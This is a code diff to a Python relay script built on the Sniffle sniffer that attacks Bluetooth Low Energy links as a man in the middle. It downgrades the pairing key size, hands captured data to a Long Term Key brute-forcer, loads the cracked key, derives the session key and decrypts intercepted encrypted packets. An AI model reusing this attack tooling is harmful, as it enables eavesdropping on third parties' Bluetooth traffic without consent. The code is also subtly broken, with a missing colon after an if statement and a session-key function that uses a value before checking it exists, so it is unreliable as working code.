@@ -24,7 +24,8 @@ from sniffle.packet_decoder import DPacketMessage, DataMessage, LlDataContMessag
         str_mac, LlControlMessage, AdvertMessage
 from sniffle.relay_protocol import RelayServer, MessageType, ErrorCode
 
-from mitble_help import downgrade_pairing_request, downgrade_pairing_response, make_ble_ccm_nonce, make_ble_ccm_counter_block, ble_ccm_encrypt
+from mitble_help import downgrade_pairing_request, downgrade_pairing_response, \
+        make_ble_ccm_nonce, make_ble_ccm_counter_block, ble_ccm_encrypt, aes128_ecb_encrypt, ble_ccm_decrypt
 
 
 from pathlib import Path
@@ -99,6 +100,10 @@ uart_last_seq = None
 
 
 link_encryption_active = False
+ltk_found = False
+ltk = None
+session_key = None
+
 enc_ctr_p_to_c = 0
 enc_ctr_c_to_p = 0
 last_sn_p_to_c = None
@@ -121,9 +126,11 @@ skd_real_cp  = None
 PROJECT_ROOT = Path(__file__).resolve().parent
 BRUTEFORCER_DIR = PROJECT_ROOT / "bruteforcer"
 EXPERIMENTS_DIR = BRUTEFORCER_DIR / "experiments"
-BRUTEFORCER_BIN = BRUTEFORCER_DIR / "bruteforce_ltk"  # C++ binary
+BRUTEFORCER_BIN = BRUTEFORCER_DIR / "bruteforce_ltk"  
 
 EXPERIMENTS_DIR.mkdir(parents=True, exist_ok=True)
+
+LTK_BIN_PATH = EXPERIMENTS_DIR/"LTK-relay"/"ltk_found.bin"
 
 def sigint_handler(sig, frame):
     hw.cancel_recv()
@@ -133,6 +140,7 @@ def sigint_handler(sig, frame):
 
 def main():
     global uart_test_pending, uart_last_seq
+    global ltk
 
     aparse = argparse.ArgumentParser(description="Relay master script for Sniffle BLE5 sniffer")
     aparse.add_argument("-s", "--serport", default=None, help="Sniffer serial port name")
@@ -311,6 +319,9 @@ def main():
             connector_random, connector_interval, connector_latency, preloads)
   #  print('Send connection request 1 sent')
     # wait for transition to master state
+
+    #try to load LTK if it is available 
+    try_load_ltk_from_file()
     while True:
         msg = hw.recv_and_decode()
         print(msg)
@@ -346,6 +357,11 @@ def main():
                 pass
 
         ready, _, _ = select(fds, [], [])
+
+        # Check if LTK is available
+        if not ltk_found
+            try_load_ltk_from_file()
+            try_update_session_key()
 
         if conn.sock in ready:
             sock_recv_print_forward(conn, args.quiet, filter_changes)
@@ -384,10 +400,6 @@ def is_param_req(pkt):
 
 
 def create_experiment_dir() -> Path:
-    """
-    Create a unique subdirectory for this experiment under bruteforcer/experiments.
-    Example: bruteforcer/experiments/20251126_163215_12345/
-    """
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
     pid = os.getpid()
     exp_id = f"{timestamp}_{pid}"
@@ -395,19 +407,62 @@ def create_experiment_dir() -> Path:
     exp_dir.mkdir(parents=True, exist_ok=False)
     return exp_dir
 
+def reset_ltk_state_for_new_pairing():
+    global ltk, ltk_found, session_key, ivm_from_c, ivs_from_p, iv_real_cp, skdm_from_c, skds_from_p, skd_real_cp
+    ltk = None
+    ltk_found = False
+    session_key = None
+    ivm_from_c = None   
+    ivs_from_p = None   
+    iv_real_cp = None   
+    skdm_from_c  = None
+    skds_from_p  = None
+    skd_real_cp  = None
+
+    try:
+        os.remove(LTK_BIN_PATH)
+        print("[LTK] Removed old LTK file because a new pairing was detected")
+    except FileNotFoundError:
+        pass
+    except Exception as e:
+        print(f"[LTK] Could not remove {LTK_BIN_PATH}: {e}")
+
+
+def try_load_ltk_from_file():
+    global ltk, ltk_found
+
+    if not os.path.exists(LTK_BIN_PATH):
+        # LTK not available yet
+        return
+
+    try:
+        with open(LTK_BIN_PATH, "rb") as f:
+            data = f.read()
+    except Exception as e:
+        print(f"[LTK] Failed to read {LTK_BIN_PATH}: {e}")
+        return
+
+    if len(data) < 16:
+        print(f"[LTK] {LTK_BIN_PATH} too short ({len(data)} bytes), expected >= 16")
+        return
+
+    # If the file is bigger, just take the first 16 bytes as the AES-128 key
+    ltk = data[:16]
+    ltk_found = True
+    print(f"[LTK] Loaded LTK from {LTK_BIN_PATH}: {_hx(ltk)}")
+
+def try_update_session_key():
+    global ltk, ltk_found, session_key, skd_real_cp
+    skd_for_aes = skd_real_cp[::-1]
+    if ltk_found and ltk is not None:
+        session_key = aes128_ecb_encrypt(ltk, skd_for_aes)
+    return
 
 def write_attack_data_binary(exp_dir: Path,
                              key_size: int,
                              plaintext: bytes,
                              ciphertext: bytes,
                              skd: bytes) -> Path:
-    """
-    attack_data.bin format (raw binary):
-        key_size (1 byte)
-        plaintext / counter block (16 bytes)
-        ciphertext / keystream (16 bytes)
-        SKD (16 bytes)
-    """
     if not (1 <= key_size <= 16):
         raise ValueError(f"key_size must be 1..16, got {key_size}")
     if len(plaintext) != 16 or len(ciphertext) != 16 or len(skd) != 16:
@@ -457,12 +512,6 @@ def _extract_smp_key_size_from_ll_body(ll_body: bytes):
 
 
 def _extract_skd_iv_from_ll_enc_req(ctrl: LlControlMessage):
-    """
-    LL_ENC_REQ (0x03), total length 23 bytes:
-        opcode | RAND(8) | EDIV(2) | SKDm(8) | IVm(4)
-
-    Returns (SKDm, IVm) or (None, None) on mismatch.
-    """
     body = ctrl.body
     if ctrl.opcode != 0x03 or len(body) < 23:
         return None, None
@@ -474,12 +523,6 @@ def _extract_skd_iv_from_ll_enc_req(ctrl: LlControlMessage):
 
 
 def _extract_skd_iv_from_ll_enc_rsp(ctrl: LlControlMessage):
-    """
-    LL_ENC_RSP (0x04), total length 13 bytes:
-        opcode | SKDs(8) | IVs(4)
-
-    Returns (SKDs, IVs) or (None, None) on mismatch.
-    """
     body = ctrl.body
     if ctrl.opcode != 0x04 or len(body) < 13:
         return None, None
@@ -489,6 +532,9 @@ def _extract_skd_iv_from_ll_enc_rsp(ctrl: LlControlMessage):
     ivs  = body[-4:]     # bytes 9..12
     return skds, ivs
 
+def decrypt_pdu(session_key: bytes, iv: bytes, packet_counter: int, direction_bit: int, pdu: bytes):
+    return ble_ccm_decrypt(session_key, iv, packet_counter, direction_bit, pdu)
+
 
 def ser_recv_print_forward(conn, quiet, filter_changes=False):
     global enc_start_seen, first_enc_rsp_pkt
@@ -496,16 +542,19 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False):
     global uart_test_pending, uart_last_seq
     global link_encryption_active, enc_ctr_p_to_c, enc_ctr_c_to_p
     global last_sn_p_to_c, last_sn_c_to_p
-    global last_pdu_p_to_c, last_pdu_c_to_p   # NEW: track last PDU bytes per direction
+    global last_pdu_p_to_c, last_pdu_c_to_p   
     global skd_real_cp, skdm_from_c, skds_from_p
     global new_key_size
-    msg = hw.recv_and_decode()
+    global ltk_found, ltk, session_key
 
+
+    msg = hw.recv_and_decode()
     if isinstance(msg, PacketMessage):
         msg = DPacketMessage.decode(msg)
         # only forward non-empty data (for printing / forwarding decisions)
         empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
         block_req = filter_changes and is_param_req(msg)
+        decrypted_payload = None
 
         # LL_START_ENC_REQ / RSP (opcode 0x05) on this link, packetCounters are reset.
         if isinstance(msg, LlControlMessage) and msg.opcode == 0x05:
@@ -539,8 +588,6 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False):
                 sn_bit = (hdr0 >> 2) & 0x01
 
                 if link_encryption_active and has_payload:
-                    #Omly increment
-                    print(f"State of uart: {uart_test_pending}")
 
                     if data_dir == 1:
                         # P -> C_r
@@ -597,10 +644,36 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False):
                                 last_sn_c_to_p = sn_bit
                                 last_pdu_c_to_p = pdu
                                 print("C_r->P NEW encrypted PDU (SN same but payload changed) – resyncing packetCounter")
+                
+                #Check for pairing DHKey Check to check for a completion of a pairingprocedure
+                #Reset ltk_found, ltk, session key, IV and SKD
+                llid = hdr0 & 0x03 
+                if has_payload and llid in (0x01, 0x02):
+                    l2cap = pdu[2:2 + length]   
+                    if len(l2cap) >= 4:
+                        # L2CAP header: len[0:2], cid[2:4]
+                        cid = l2cap[2] | (l2cap[3] << 8)
+                        if cid == 0x0006:       # SMP 
+                            smp = l2cap[4:]
+                            if len(smp) >= 1:
+                                smp_code = smp[0]
+                                # 0x0D = Pairing DHKey Check
+                                if smp_code == 0x0D:
+                                    print("[SMP] Pairing DHKey Check from peripheral – resetting LTK/session state")
+                                    reset_ltk_state_for_new_pairing()
+
 
             # direction bit for CCM nonce:
             # BLE: directionBit = 0 for P->C, 1 for C->P
             direction_bit = 0 if data_dir == 1 else 1   # FIXED: was always 0 before
+
+            if (link_encryption_active and has_payload and packet_counter is not None and ltk_found and session_key is not None and iv_real_cp is not None):
+                pt, mic_ok = decrypt_pdu(session_key, iv_real_cp, packet_counter, direction_bit, pdu)
+                decrypted_payload = pt
+                if not mic_ok:
+                    packet_counter = enc_ctr_c_to_p
+                    enc_ctr_c_to_p += 1
+
 
             if uart_test_pending and not empty and data_dir == 1:
                 print("Encrypted packet will be sent by P!")
@@ -644,7 +717,7 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False):
                     if skd_real_cp is None:
                         print("[BRUTEFORCER] SKD not yet known, cannot write attack data")
                     else:
-                        # SKD should be given from MSB to LSB, so concatenate IV's like SKD_c||SKD_p does not work
+                        # SKD should be given from MSB to LSB, so concatenate SKD's like SKD_c||SKD_p does not work
                         # We flip the bytes, so we get the same convention as in the SPEC and NIMBLE
                         # TODO fix it when concatenation is done
                         skd_for_aes = skd_real_cp[::-1]
@@ -689,6 +762,8 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False):
             if skdm_from_c is not None and skds_from_p is not None and skd_real_cp is None:
                 skd_real_cp = skdm_from_c + skds_from_p
                 print(f"[SKD] Combined real C<->P SKD (SKDm||SKDs): {_hx(skd_real_cp)}")
+                if ltk_found:
+                    try_update_session_key()
 
         # Downgrade entropy (max key size parameter)
         if not empty and not block_req and isinstance(msg, DataMessage):
@@ -710,6 +785,24 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False):
             # LL_REJECT_EXT_IND, unacceptable connection parameters
             hw.cmd_transmit(3, b'\x11\x0F\x3B')
 
+    #Decrypt the payload for printing
+    if isinstance(msg, DataMessage) and decrypted_payload is not None:
+        pdu    = msg.body
+        hdr0   = pdu[0]
+        length = pdu[1]
+
+        # payload+MIC 
+        payload_plus_mic = pdu[2:2 + length]
+
+        MIC_LEN = 4
+        ciphertext_len = len(payload_plus_mic) - MIC_LEN
+
+        # split into old ciphertext + MIC
+        mic = payload_plus_mic[ciphertext_len:]
+
+        # rebuild body: same header, same length, decrypted payload, same MIC
+        msg.body = bytes([hdr0, length]) + decrypted_payload + mic
+        print("The payload of this packet is decrypted.")
     print_message(msg, quiet)
 
 
